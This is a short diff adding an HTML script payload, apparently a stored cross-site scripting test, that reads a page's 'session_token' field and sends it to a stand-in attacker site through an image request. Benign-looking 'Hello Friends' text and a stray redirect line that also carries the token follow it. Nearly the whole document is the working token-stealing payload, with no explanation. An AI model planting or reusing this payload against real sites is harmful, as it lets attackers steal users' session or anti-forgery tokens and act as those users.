@@ -1,0 +1,16 @@
+<script>
+
+var x= document.getElementsByName("session_token");
+var formTokenInput = x[0];
+var formTokenValue = formTokenInput.value;
+
+var i= new Image(); 
+i.src = "csrfAttackerWebsite/data.php?local="+formTokenValue;
+</script> Hello Friends
+
+
+
+
+
+
+window.location.href = "data.php?local=" + formTokenValue;
